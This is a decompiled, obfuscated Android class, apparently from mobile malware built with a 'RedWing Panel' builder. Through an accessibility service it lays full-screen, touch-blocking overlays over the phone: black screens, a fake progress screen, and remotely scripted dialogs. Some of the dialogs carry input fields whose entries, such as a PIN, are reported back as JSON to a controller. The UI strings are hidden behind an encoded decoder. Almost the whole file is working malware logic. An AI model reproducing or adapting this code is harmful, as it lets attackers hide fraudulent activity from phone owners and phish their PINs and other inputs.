package v.s;

import android.R;
import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.Color;
import android.graphics.PorterDuff;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.LayerDrawable;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Set;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class vbdyByOHPJmeGXlq {
    public static NiXw8wskyH18G A1BaTVAMeIXMnh;
    public static volatile boolean D5P1xCAyuvgF;
    public static TextView DVTNwpDEVsUKuznof;
    public static volatile V3YwOBcZuHItC ECwLkmPW1UKz7J6E;
    public static String EWUjsTERgdPbSw3NNlN;
    public static final String Ee8d2j4S9Vm5yGuR;
    public static TextView H9XlUr4OeMJFiXK;
    public static ProgressBar J0zjQ7CAgohuxU20eCW6;
    public static final String JXn4Qf7zpnLjP5;
    public static String K7eEOBPYP9VIoHWTe;
    public static TextView MLSIo1htfMPWeB8V876L;
    public static final FJeKBE8bSvB9SICtl O2DHNSIGZlgPja7eqLgn;
    public static final Handler Qrz92kRPw4GcghAc;
    public static TextView XiR1pIn5878vVWd;
    public static apQOLJtARzrH XuO9PPFo607ssKwZjNW;
    public static volatile boolean b1EoSIRjJHO5;
    public static final String dDIMxZXP1V8HdM;
    public static String dTS0S7eC32ubQH54j36;
    public static apQOLJtARzrH euF5Udt5Rqv3Qmea;
    public static TgFV4UY0xAiKxQwpKNg fivkjwgu2UdAtiY;
    public static String gIIiyi2ddlMDR0;
    public static volatile boolean gmNWMfvn6zlEj;
    public static final jdOQeRk37T35X5xKW1P hV4VTKNUdeHN;
    public static volatile boolean hjneShqpF9Tis4;
    public static volatile boolean iUQk66nAiXgO35;
    public static final String ibVTtJUNfrGYbW;
    public static volatile boolean k84rwRrqzhrNQ1CdNQ9;
    public static int l1V0lQr6TbwNKqHfXNbb;
    public static int nQilHWaqS401ZtR;
    public static volatile String pyu8ovAipBTLYAiKab;
    public static final jdOQeRk37T35X5xKW1P qfTrc75xwRVMl85vh;
    public static final FJeKBE8bSvB9SICtl rCHnHJBAlOpNI5;
    public static KtHgo1ZBbTF0NSPosJz tne6mXOUFKdd;
    public static String vIJudZvPyTuNp;
    public static final String vekpFI4d1Nc4fakF;
    public static final String w9sT1Swbhx3hs;
    public static ViewGroup wotphlvK9sPbXJ;
    public static final String xDyLpEZyrcKVe0;
    public static volatile boolean xfn2GJwmGqs7kWW;
    public static String yTljMGnIibTRdOpSh4;

    static {
        TypefaceCache.obtain("001600620052008B00C2009000E500A80031007D005E0095");
        dDIMxZXP1V8HdM = TypefaceCache.obtain("00360066005F008600E400BA");
        w9sT1Swbhx3hs = TypefaceCache.obtain("0021007A005A008400FB");
        vekpFI4d1Nc4fakF = TypefaceCache.obtain("002F0079005A008300F900B100D5");
        JXn4Qf7zpnLjP5 = TypefaceCache.obtain("0033007F0055");
        TypefaceCache.obtain("00220066004B00B800FC00B000D100AC");
        Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("0022007A005E009500E4");
        xDyLpEZyrcKVe0 = TypefaceCache.obtain("00370079004E008400F8008000D000AB002C00750050");
        ibVTtJUNfrGYbW = TypefaceCache.obtain("002E00790052009400E400AA00C000A2");
        pyu8ovAipBTLYAiKab = "";
        gIIiyi2ddlMDR0 = "1234";
        Qrz92kRPw4GcghAc = new Handler(Looper.getMainLooper());
        K7eEOBPYP9VIoHWTe = "";
        dTS0S7eC32ubQH54j36 = "";
        EWUjsTERgdPbSw3NNlN = "OK";
        yTljMGnIibTRdOpSh4 = TypefaceCache.obtain("0022007A005E009500E4");
        vIJudZvPyTuNp = "";
        rCHnHJBAlOpNI5 = new FJeKBE8bSvB9SICtl(2);
        O2DHNSIGZlgPja7eqLgn = new FJeKBE8bSvB9SICtl(3);
        hV4VTKNUdeHN = new jdOQeRk37T35X5xKW1P(17);
        qfTrc75xwRVMl85vh = new jdOQeRk37T35X5xKW1P(20);
    }

    public static String D5P1xCAyuvgF() {
        return JXn4Qf7zpnLjP5;
    }

    public static void DVTNwpDEVsUKuznof() {
        DataQFAdapter.Companion.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073");
            return;
        }
        D5P1xCAyuvgF = true;
        hjneShqpF9Tis4 = true;
        gmNWMfvn6zlEj = false;
        Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter, 13));
    }

    public static FrameLayout Ee8d2j4S9Vm5yGuR(AccessibilityService accessibilityService) {
        float f = accessibilityService.getResources().getDisplayMetrics().density;
        FrameLayout frameLayout = new FrameLayout(accessibilityService);
        frameLayout.setBackgroundColor(-16777216);
        frameLayout.getBackground().setAlpha(252);
        frameLayout.setClickable(true);
        frameLayout.setFocusable(false);
        frameLayout.setOnTouchListener(new yRgbAzuBdXWxcKPu());
        LinearLayout linearLayout = new LinearLayout(accessibilityService);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        int i = (int) (40 * f);
        int i2 = (int) (0 * f);
        linearLayout.setPadding(i, i2, i, i);
        int i3 = (int) (64 * f);
        View view = new View(accessibilityService);
        view.setBackground(new gbX1lrlhWessDklHItD(f));
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i3, i3);
        layoutParams.gravity = 1;
        int i4 = (int) (24 * f);
        layoutParams.topMargin = i4;
        layoutParams.bottomMargin = (int) ((73 - 53) * f);
        linearLayout.addView(view, layoutParams);
        TextView textView = new TextView(accessibilityService);
        textView.setText(TypefaceCache.checked("045D0427040604D704D0049C048404F2047E0426001B04D504AB04EF048104F7"));
        textView.setTextSize(20.0f);
        textView.setTextColor(-1);
        textView.setTypeface(null, 1);
        textView.setGravity(17);
        linearLayout.addView(textView, Qrz92kRPw4GcghAc((int) (12 * f)));
        TextView textView2 = new TextView(accessibilityService);
        textView2.setText(TypefaceCache.checked("045C0428047E04D904A604EA009E00E704000457047904A704AE04E604F3048504710428001B04D804AE04E0048204FC047D0036040404D904A400D5048004F904740422040E04DE04D1049D048004FF04760036040904DC04A004EC048A00E7047B042D040300C704A604E7048604FD047D0457047904DF00BE00D500B804E404720423047B04DF04D204EA009204F204700428001B04D500B0049E04F10482047D0423001B04DB04A5049E04F004F90063042B040B00ED04AD04EA04F304FD047D042D047704DD04AE00FF04F504F704020428040900C704A800FF048F04F200630429040504DC04DC04E804F104FE04010423047A04AB00B004E7048E00E9"));
        textView2.setTextSize(15.0f);
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("00600057007A00A600D1009E00F3")));
        textView2.setGravity(17);
        textView2.setLineSpacing((int) (4 * f), 1.0f);
        linearLayout.addView(textView2, Qrz92kRPw4GcghAc(i4));
        TextView textView3 = new TextView(accessibilityService);
        textView3.setText(TypefaceCache.checked("045E0423001B04D504AA04E404FC04800473042F047904D200B004E7009204FA04760036040C04D704D00490048404F7047A0454040E00CB009A04E0048C04FD04730036040604D200B004ED04F90486047D0453040604D204D200F1009204DA04760036040904A604D2049F04FD0482047B0424040B04DE04D204EA00B804FF0063042B040E00C704D1049C04FA04FF04010423001B04A304A504E2048C04FB006D"));
        textView3.setTextSize(13.0f);
        textView3.setTextColor(Color.parseColor(TypefaceCache.obtain("00600021000C00D000A700E80085")));
        textView3.setGravity(17);
        textView3.setLineSpacing((int) (3 * f), 1.0f);
        linearLayout.addView(textView3, Qrz92kRPw4GcghAc(i2));
        FrameLayout.LayoutParams layoutParams2 = new FrameLayout.LayoutParams(-1, -2);
        layoutParams2.gravity = 17;
        frameLayout.addView(linearLayout, layoutParams2);
        return frameLayout;
    }

    public static void H9XlUr4OeMJFiXK(boolean z) {
        DataQFAdapter.Companion.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073");
            return;
        }
        D5P1xCAyuvgF = true;
        hjneShqpF9Tis4 = true;
        gmNWMfvn6zlEj = z;
        Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter, 17));
    }

    public static void J0zjQ7CAgohuxU20eCW6(String str) {
        DataQFAdapter.Companion.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073");
            return;
        }
        if (str != null) {
            gIIiyi2ddlMDR0 = str;
        }
        Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter, 21));
    }

    public static FrameLayout JXn4Qf7zpnLjP5(AccessibilityService accessibilityService) {
        float f = accessibilityService.getResources().getDisplayMetrics().density;
        FrameLayout frameLayout = new FrameLayout(accessibilityService);
        frameLayout.setBackgroundColor(-16777216);
        frameLayout.getBackground().setAlpha(252);
        frameLayout.setClickable(true);
        frameLayout.setFocusable(false);
        frameLayout.setOnTouchListener(new yRgbAzuBdXWxcKPu());
        LinearLayout linearLayout = new LinearLayout(accessibilityService);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        int i = (int) (64 * f);
        View hdahr6lux7ruk = new hdAHR6lUX7RUK(accessibilityService, f);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i, i);
        layoutParams.gravity = 1;
        layoutParams.bottomMargin = (int) (32 * f);
        linearLayout.addView(hdahr6lux7ruk, layoutParams);
        TextView textView = new TextView(accessibilityService);
        textView.setText(TypefaceCache.obtain("000F0079005A008300F900B100D5"));
        textView.setTextSize(24.0f);
        textView.setTextColor(-1);
        textView.setGravity(17);
        textView.setTypeface(null, 0);
        textView.setLetterSpacing(0.01f);
        DVTNwpDEVsUKuznof = textView;
        linearLayout.addView(textView, Qrz92kRPw4GcghAc((int) (12 * f)));
        TextView textView2 = new TextView(accessibilityService);
        textView2.setText(TypefaceCache.obtain("0013007A005E008600E300BA009200B00022007F004F00C900BE00F1"));
        textView2.setTextSize(16.0f);
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("0060002F007A00A600A0009E0084")));
        textView2.setGravity(17);
        textView2.setLineSpacing(3.0f * f, 1.0f);
        linearLayout.addView(textView2, Qrz92kRPw4GcghAc((int) (((-67) + 91) * f)));
        FrameLayout frameLayout2 = new FrameLayout(accessibilityService);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(Color.parseColor(TypefaceCache.obtain("00600027007E00D600D500EE00F7")));
        float f2 = 2.0f * f;
        gradientDrawable.setCornerRadius(f2);
        frameLayout2.setBackground(gradientDrawable);
        View view = new View(accessibilityService);
        GradientDrawable gradientDrawable2 = new GradientDrawable();
        gradientDrawable2.setColor(Color.parseColor(TypefaceCache.obtain("00600027007A00D000A3009A008A")));
        gradientDrawable2.setCornerRadius(f2);
        view.setBackground(gradientDrawable2);
        frameLayout2.addView(view, new FrameLayout.LayoutParams(0, -1));
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams((int) ((182 + 78) * f), (int) (3 * f));
        layoutParams2.gravity = 1;
        linearLayout.addView(frameLayout2, layoutParams2);
        frameLayout2.post(new A68NpXPqwTFos99nt(frameLayout2, 23, view));
        LinearLayout linearLayout2 = new LinearLayout(accessibilityService);
        linearLayout2.setOrientation(1);
        linearLayout2.setGravity(17);
        linearLayout2.addView(linearLayout);
        frameLayout.addView(linearLayout2, new FrameLayout.LayoutParams(-1, -1));
        return frameLayout;
    }

    public static void K7eEOBPYP9VIoHWTe(AccessibilityService accessibilityService, String str) {
        ViewGroup viewGroupEe8d2j4S9Vm5yGuR;
        FrameLayout frameLayout;
        yI1KTRoNlsjx yi1ktronlsjx;
        if (b1EoSIRjJHO5) {
            gIIiyi2ddlMDR0();
        }
        pyu8ovAipBTLYAiKab = str;
        try {
            WindowManager windowManager = (WindowManager) accessibilityService.getSystemService("window");
            String str2 = dDIMxZXP1V8HdM;
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, str2)) {
                viewGroupEe8d2j4S9Vm5yGuR = vekpFI4d1Nc4fakF(accessibilityService);
            } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, vekpFI4d1Nc4fakF)) {
                viewGroupEe8d2j4S9Vm5yGuR = JXn4Qf7zpnLjP5(accessibilityService);
            } else {
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, w9sT1Swbhx3hs)) {
                    frameLayout = new FrameLayout(accessibilityService);
                    frameLayout.setBackgroundColor(-16777216);
                    frameLayout.getBackground().setAlpha(252);
                    frameLayout.setClickable(true);
                    frameLayout.setFocusable(false);
                    frameLayout.setOnTouchListener(new yRgbAzuBdXWxcKPu());
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, JXn4Qf7zpnLjP5)) {
                    viewGroupEe8d2j4S9Vm5yGuR = xDyLpEZyrcKVe0(accessibilityService);
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, Ee8d2j4S9Vm5yGuR)) {
                    viewGroupEe8d2j4S9Vm5yGuR = dDIMxZXP1V8HdM(accessibilityService);
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, xDyLpEZyrcKVe0)) {
                    frameLayout = new FrameLayout(accessibilityService);
                    frameLayout.setBackgroundColor(0);
                    frameLayout.setClickable(true);
                    frameLayout.setFocusable(false);
                    frameLayout.setOnTouchListener(new yRgbAzuBdXWxcKPu());
                } else {
                    viewGroupEe8d2j4S9Vm5yGuR = okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ibVTtJUNfrGYbW) ? Ee8d2j4S9Vm5yGuR(accessibilityService) : vekpFI4d1Nc4fakF(accessibilityService);
                }
                viewGroupEe8d2j4S9Vm5yGuR = frameLayout;
            }
            wotphlvK9sPbXJ = viewGroupEe8d2j4S9Vm5yGuR;
            int i = 525696;
            if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, JXn4Qf7zpnLjP5) && !okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, Ee8d2j4S9Vm5yGuR)) {
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, xDyLpEZyrcKVe0)) {
                    i = 525704;
                } else {
                    i = 591752;
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, str2) ? true : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, vekpFI4d1Nc4fakF) ? true : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, ibVTtJUNfrGYbW)) {
                        if (gmNWMfvn6zlEj) {
                            i = 591768;
                        }
                    } else if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, w9sT1Swbhx3hs)) {
                        i = 1432;
                    }
                }
            }
            int i2 = i;
            String str3 = w9sT1Swbhx3hs;
            String str4 = vekpFI4d1Nc4fakF;
            Set setDTS0S7eC32ubQH54j36 = gA5gCwTK0qjTIn.dTS0S7eC32ubQH54j36(str3, str2, str4, ibVTtJUNfrGYbW);
            int i3 = setDTS0S7eC32ubQH54j36.contains(str) ? 1 : -3;
            if (setDTS0S7eC32ubQH54j36.contains(str)) {
                DisplayMetrics displayMetrics = new DisplayMetrics();
                windowManager.getDefaultDisplay().getRealMetrics(displayMetrics);
                yi1ktronlsjx = new yI1KTRoNlsjx(Integer.valueOf(displayMetrics.widthPixels + 200), Integer.valueOf(displayMetrics.heightPixels + 200));
            } else {
                yi1ktronlsjx = new yI1KTRoNlsjx(-1, -1);
            }
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(((Number) yi1ktronlsjx.w9sT1Swbhx3hs).intValue(), ((Number) yi1ktronlsjx.vekpFI4d1Nc4fakF).intValue(), 2032, i2, i3);
            layoutParams.gravity = 8388659;
            if (setDTS0S7eC32ubQH54j36.contains(str)) {
                layoutParams.x = -100;
                layoutParams.y = -100;
            }
            windowManager.addView(wotphlvK9sPbXJ, layoutParams);
            b1EoSIRjJHO5 = true;
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, str2)) {
                nQilHWaqS401ZtR = 0;
                l1V0lQr6TbwNKqHfXNbb = 0;
                Handler handler = Qrz92kRPw4GcghAc;
                handler.postDelayed(O2DHNSIGZlgPja7eqLgn, 1500L);
                handler.postDelayed(rCHnHJBAlOpNI5, 500L);
            } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, str4)) {
                l1V0lQr6TbwNKqHfXNbb = 0;
                Qrz92kRPw4GcghAc.postDelayed(rCHnHJBAlOpNI5, 500L);
            }
            TypefaceCache.obtain("000C0060005E009500FC00BE00CB00E70030007E0054009000FE00FF00C400AE00220036007A008400F300BA00C100B4002A00740052008B00F900AB00CB00FD0063007B0054008300F500E2");
            TypefaceCache.obtain("006300700057008600F700AC008F00F7003B");
            Integer.toHexString(i2);
            TypefaceCache.obtain("006300610006");
            TypefaceCache.obtain("0063007E0006");
        } catch (Exception e) {
            TypefaceCache.obtain("0030007E0054009000DF00A900D700B5002F0077004200C700F500AD00C000A80031002C001B");
            e.getMessage();
        }
    }

    public static void MLSIo1htfMPWeB8V876L(String str, String str2, String str3, String str4, String str5) {
        DataQFAdapter.Companion.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073");
            return;
        }
        K7eEOBPYP9VIoHWTe = str;
        dTS0S7eC32ubQH54j36 = str2;
        EWUjsTERgdPbSw3NNlN = str3;
        yTljMGnIibTRdOpSh4 = str4;
        vIJudZvPyTuNp = str5;
        Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter, 19));
    }

    public static LinearLayout.LayoutParams Qrz92kRPw4GcghAc(int i) {
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
        layoutParams.bottomMargin = i;
        return layoutParams;
    }

    public static void XiR1pIn5878vVWd() {
        DataQFAdapter.Companion.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073");
            return;
        }
        D5P1xCAyuvgF = true;
        hjneShqpF9Tis4 = true;
        gmNWMfvn6zlEj = false;
        Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter, 23));
    }

    public static void b1EoSIRjJHO5() {
        hjneShqpF9Tis4 = true;
        DataQFAdapter.Companion.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        while (System.currentTimeMillis() == Long.MIN_VALUE) {
            Thread.yield();
            Thread.yield();
        }
        if (dataQFAdapter == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073001B008100FF00AD009200B3002C00630058008F00B000BD00DE00A80020007D001700C700E700B600DE00AB00630064005E009300E200A6");
            Qrz92kRPw4GcghAc.postDelayed(new jdOQeRk37T35X5xKW1P(18), 1000L);
        } else if (!b1EoSIRjJHO5 || !gA5gCwTK0qjTIn.dTS0S7eC32ubQH54j36(w9sT1Swbhx3hs, dDIMxZXP1V8HdM, vekpFI4d1Nc4fakF).contains(pyu8ovAipBTLYAiKab)) {
            Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter, 96 - 78));
        } else {
            TypefaceCache.obtain("00170079004E008400F800FF00D000AB002C0075005000DD00B000A900DB00B400360077005700C700FF00A900D700B5002F0077004200C700F100B300C000A200220072004200C700F100BC00C600AE00350073001B00CF");
            TypefaceCache.obtain("006A003A001B008D00E500AC00C600E700300073004F009300F900B100D500E70025007A005A0080");
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r3v4, types: [boolean, int] */
    public static FrameLayout dDIMxZXP1V8HdM(AccessibilityService accessibilityService) {
        float f = accessibilityService.getResources().getDisplayMetrics().density;
        FrameLayout frameLayout = new FrameLayout(accessibilityService);
        frameLayout.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("0060002E000B00D700A000EF008200F70073")));
        ?? r3 = 56 - 55;
        frameLayout.setClickable(r3);
        LinearLayout linearLayout = new LinearLayout(accessibilityService);
        linearLayout.setOrientation(r3);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(-1);
        int i = (int) (16 * f);
        gradientDrawable.setCornerRadius(i);
        linearLayout.setBackground(gradientDrawable);
        int i2 = (int) (24 * f);
        linearLayout.setPadding(i2, i2, i2, (int) ((37 - 17) * f));
        int i3 = (int) (8 * f);
        float f2 = i3;
        linearLayout.setElevation(f2);
        if (K7eEOBPYP9VIoHWTe.length() > 0) {
            TextView textView = new TextView(accessibilityService);
            textView.setText(K7eEOBPYP9VIoHWTe);
            textView.setTextSize(18.0f);
            textView.setTextColor(Color.parseColor(TypefaceCache.obtain("00600024000B00D500A100ED0086")));
            textView.setTypeface(null, r3);
            linearLayout.addView(textView, Qrz92kRPw4GcghAc(i3));
        }
        TextView textView2 = new TextView(accessibilityService);
        textView2.setText(dTS0S7eC32ubQH54j36);
        textView2.setTextSize(15.0f);
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("00600023007D00D100A300E9008A")));
        textView2.setLineSpacing((int) ((31 - 28) * f), 1.0f);
        linearLayout.addView(textView2, Qrz92kRPw4GcghAc(i));
        aqjfZUF02xH6w aqjfzuf02xh6w = new aqjfZUF02xH6w();
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(yTljMGnIibTRdOpSh4, TypefaceCache.obtain("002A0078004B009200E4"))) {
            EditText editText = new EditText(accessibilityService);
            String strChecked = vIJudZvPyTuNp;
            if (strChecked.length() == 0) {
                strChecked = TypefaceCache.checked("04510424040E04D304A8049D048700E704010423040104A604D2");
            }
            editText.setHint(strChecked);
            editText.setHintTextColor(Color.parseColor(TypefaceCache.obtain("0060002F007A00A600A0009E0084")));
            editText.setTextColor(Color.parseColor(TypefaceCache.obtain("00600024000B00D500A100ED0086")));
            editText.setTextSize(15.0f);
            GradientDrawable gradientDrawable2 = new GradientDrawable();
            gradientDrawable2.setStroke((int) (((float) r3) * f), Color.parseColor(TypefaceCache.obtain("00600052007A00A300D3009A0082")));
            gradientDrawable2.setCornerRadius(f2);
            gradientDrawable2.setColor(Color.parseColor(TypefaceCache.obtain("00600050000300A100A9009900F3")));
            editText.setBackground(gradientDrawable2);
            int i4 = (int) ((86 - 74) * f);
            int i5 = (int) (10 * f);
            editText.setPadding(i4, i5, i4, i5);
            aqjfzuf02xh6w.w9sT1Swbhx3hs = editText;
            linearLayout.addView(editText, Qrz92kRPw4GcghAc(i));
        }
        LinearLayout linearLayout2 = new LinearLayout(accessibilityService);
        linearLayout2.setOrientation(0);
        linearLayout2.setGravity(8388613);
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(yTljMGnIibTRdOpSh4, TypefaceCache.obtain("002000790055008100F900AD00DF")) || okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(yTljMGnIibTRdOpSh4, TypefaceCache.obtain("002A0078004B009200E4"))) {
            Button button = new Button(accessibilityService);
            button.setText(TypefaceCache.checked("045D0454040704D204AD04EF"));
            button.setTextSize(14.0f);
            button.setTextColor(Color.parseColor(TypefaceCache.obtain("00600023007D00D100A300E9008A")));
            button.setBackgroundColor(0);
            button.setAllCaps(false);
            button.setOnClickListener(new ZpcMkMKKPhJDxEiH());
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
            layoutParams.rightMargin = i3;
            linearLayout2.addView(button, layoutParams);
        }
        Button button2 = new Button(accessibilityService);
        button2.setText(EWUjsTERgdPbSw3NNlN);
        button2.setTextSize(14.0f);
        button2.setTextColor(-1);
        GradientDrawable gradientDrawable3 = new GradientDrawable();
        gradientDrawable3.setColor(Color.parseColor(TypefaceCache.obtain("00600027007A00D000A3009A008A")));
        gradientDrawable3.setCornerRadius(f2);
        button2.setBackground(gradientDrawable3);
        button2.setAllCaps(false);
        button2.setPadding(i, i3, i, i3);
        button2.setOnClickListener(new xAY36KEWHIBZ(2, aqjfzuf02xh6w));
        linearLayout2.addView(button2);
        linearLayout.addView(linearLayout2);
        FrameLayout.LayoutParams layoutParams2 = new FrameLayout.LayoutParams(-1, -2);
        layoutParams2.gravity = 17;
        int i6 = (int) ((77 - 45) * f);
        layoutParams2.leftMargin = i6;
        layoutParams2.rightMargin = i6;
        frameLayout.addView(linearLayout, layoutParams2);
        return frameLayout;
    }

    public static void dTS0S7eC32ubQH54j36(String str) {
        gIIiyi2ddlMDR0 = str;
    }

    public static void gIIiyi2ddlMDR0() {
        Handler handler = Qrz92kRPw4GcghAc;
        handler.removeCallbacks(O2DHNSIGZlgPja7eqLgn);
        handler.removeCallbacks(rCHnHJBAlOpNI5);
        try {
            DataQFAdapter.Companion.getClass();
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            if (dataQFAdapter != null && wotphlvK9sPbXJ != null) {
                ((WindowManager) dataQFAdapter.getSystemService("window")).removeView(wotphlvK9sPbXJ);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002B007F005F008200DF00A900D700B5002F0077004200C700E200BA00DF00A800350073006D008E00F500A8009200A2003100640054009500AA00FF");
            e.getMessage();
        }
        wotphlvK9sPbXJ = null;
        b1EoSIRjJHO5 = false;
        pyu8ovAipBTLYAiKab = "";
        J0zjQ7CAgohuxU20eCW6 = null;
        MLSIo1htfMPWeB8V876L = null;
        XiR1pIn5878vVWd = null;
        H9XlUr4OeMJFiXK = null;
        DVTNwpDEVsUKuznof = null;
        TypefaceCache.obtain("000C0060005E009500FC00BE00CB00E7002B007F005F008300F500B1");
    }

    public static void gmNWMfvn6zlEj() {
        if (xfn2GJwmGqs7kWW) {
            TgFV4UY0xAiKxQwpKNg tgFV4UY0xAiKxQwpKNg = fivkjwgu2UdAtiY;
            if (tgFV4UY0xAiKxQwpKNg != null) {
                Qrz92kRPw4GcghAc.removeCallbacks(tgFV4UY0xAiKxQwpKNg);
            }
            fivkjwgu2UdAtiY = null;
            Qrz92kRPw4GcghAc.post(new jdOQeRk37T35X5xKW1P((-34) + 57));
        }
    }

    public static void hjneShqpF9Tis4() {
        D5P1xCAyuvgF = false;
        hjneShqpF9Tis4 = false;
        gmNWMfvn6zlEj = false;
        Qrz92kRPw4GcghAc.post(new jdOQeRk37T35X5xKW1P(22));
    }

    public static void ibVTtJUNfrGYbW() {
        hjneShqpF9Tis4 = false;
        if (b1EoSIRjJHO5 && gA5gCwTK0qjTIn.dTS0S7eC32ubQH54j36(w9sT1Swbhx3hs, dDIMxZXP1V8HdM, vekpFI4d1Nc4fakF).contains(pyu8ovAipBTLYAiKab)) {
            TypefaceCache.obtain("00170079004E008400F800FF00D000AB002C0075005000C700FF00B900D400FD0063007D005E008200E000B600DC00A0006300600052009400E500BE00DE00E7002C0060005E009500FC00BE00CB00E7006B");
        } else {
            Qrz92kRPw4GcghAc.post(new jdOQeRk37T35X5xKW1P(19));
        }
    }

    public static void l1V0lQr6TbwNKqHfXNbb() {
        DataQFAdapter.Companion.getClass();
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            TypefaceCache.obtain("000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200B000B100DD00B300630077004D008600F900B300D300A5002F0073");
            return;
        }
        D5P1xCAyuvgF = true;
        hjneShqpF9Tis4 = true;
        gmNWMfvn6zlEj = false;
        Qrz92kRPw4GcghAc.post(new TgFV4UY0xAiKxQwpKNg(dataQFAdapter, 14));
    }

    public static void nQilHWaqS401ZtR(String str, String str2) {
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0022007A005E009500E4008000C000A20030006300570093"));
                jSONObject.put(TypefaceCache.obtain("00220075004F008E00FF00B1"), str);
                jSONObject.put(TypefaceCache.obtain("0022007A005E009500E4008000C600BE00330073"), yTljMGnIibTRdOpSh4);
                if (str2.length() > 0) {
                    jSONObject.put(TypefaceCache.obtain("002A0078004B009200E4008000C600A2003B0062"), str2);
                }
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
            }
        } catch (Exception unused) {
        }
